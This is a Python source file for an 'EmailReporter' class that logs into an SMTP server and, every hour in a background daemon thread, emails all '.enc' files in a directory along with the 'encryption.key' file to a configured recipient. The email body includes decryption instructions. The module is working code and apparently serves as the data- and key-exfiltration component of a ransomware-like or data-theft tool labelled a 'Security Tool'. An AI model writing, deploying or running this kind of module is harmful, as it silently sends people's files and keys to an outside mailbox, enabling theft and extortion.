import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os
import datetime
import time
import threading

class EmailReporter:
    def __init__(self, 
                 smtp_server="smtp.gmail.com", 
                 smtp_port=587,
                 sender_email=None,
                 sender_password=None,
                 recipient_email=None,
                 interval=3600):  # Default: 1 hour
        """Initialize email reporter."""
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.sender_email = sender_email
        self.sender_password = sender_password
        self.recipient_email = recipient_email
        self.interval = interval
        self.running = False
        
        # Check if credentials are provided
        self.configured = bool(sender_email and sender_password and recipient_email)
        if not self.configured:
            print("Email reporting not configured. Please provide credentials.")
    
    def send_email(self, subject, body, attachments=None):
        """Send an email with optional attachments."""
        if not self.configured:
            print("Email reporting not configured. Skipping.")
            return False
        
        try:
            # Create message
            msg = MIMEMultipart()
            msg['From'] = self.sender_email
            msg['To'] = self.recipient_email
            msg['Subject'] = subject
            
            # Add body
            msg.attach(MIMEText(body, 'plain'))
            
            # Add attachments
            if attachments:
                for file_path in attachments:
                    if os.path.exists(file_path):
                        attachment = open(file_path, "rb")
                        part = MIMEBase('application', 'octet-stream')
                        part.set_payload(attachment.read())
                        encoders.encode_base64(part)
                        part.add_header('Content-Disposition', 
                                       f'attachment; filename= {os.path.basename(file_path)}')
                        msg.attach(part)
                        attachment.close()
            
            # Connect to server and send
            server = smtplib.SMTP(self.smtp_server, self.smtp_port)
            server.starttls()
            server.login(self.sender_email, self.sender_password)
            server.send_message(msg)
            server.quit()
            
            print(f"Email sent to {self.recipient_email}")
            return True
        except Exception as e:
            print(f"Error sending email: {e}")
            return False
    
    def _reporting_loop(self, directory):
        """Main reporting loop."""
        while self.running:
            self.send_report(directory)
            time.sleep(self.interval)
    
    def send_report(self, directory):
        """Send a report with ALL encrypted files and encryption key from the most recent run."""
        if not self.configured:
            return False
        
        try:
            # Files to attach
            files_to_attach = []
            key_file = None
            encrypted_files = []
            
            print(f"Preparing email report for directory: {directory}")
            
            # First, find the encryption key
            key_path = os.path.join(directory, "encryption.key")
            if os.path.exists(key_path):
                key_file = key_path
                files_to_attach.append(key_path)
                print(f"Found encryption key: {key_path}")
            else:
                print(f"Warning: Encryption key not found at {key_path}")
            
            # Walk through the directory to find all encrypted files
            for root, _, filenames in os.walk(directory):
                for filename in filenames:
                    if filename.endswith(".enc"):
                        file_path = os.path.join(root, filename)
                        encrypted_files.append(file_path)
                        # Only attach files smaller than 25MB (email attachment limit)
                        if os.path.getsize(file_path) < 25_000_000:
                            files_to_attach.append(file_path)
                            print(f"Adding encrypted file: {file_path}")
                        else:
                            print(f"Skipping large file (too big for email): {file_path}")
            
            if not files_to_attach:
                print("No files found to send.")
                return False
            
            # Generate report text
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            subject = f"Complete Encrypted Data - {timestamp}"
            body = f"""
            Security Tool Complete Encryption Report
            Generated: {timestamp}
            
            Directory: {directory}
            Encryption key: {"Included" if key_file else "Not found"}
            Encrypted files: {len(encrypted_files)} found, {len(files_to_attach)-1 if key_file else len(files_to_attach)} attached
            
            To decrypt the files:
            1. Save the encryption.key file to your computer
            2. Run: python decrypt.py encryption.key encrypted_file.enc
            """
            
            print(f"Sending email with {len(files_to_attach)} attachments")
            return self.send_email(subject, body, files_to_attach)
        except Exception as e:
            print(f"Error preparing encryption report: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def start(self, directory):
        """Start periodic reporting."""
        if not self.configured:
            print("Email reporting not configured. Cannot start.")
            return self
        
        print(f"Starting email reporter, monitoring {directory}")
        self.running = True
        
        self.thread = threading.Thread(target=self._reporting_loop, args=(directory,))
        self.thread.daemon = True
        self.thread.start()
        return self
    
    def stop(self):
        """Stop periodic reporting."""
        if self.running:
            self.running = False
            print("Email reporter stopped")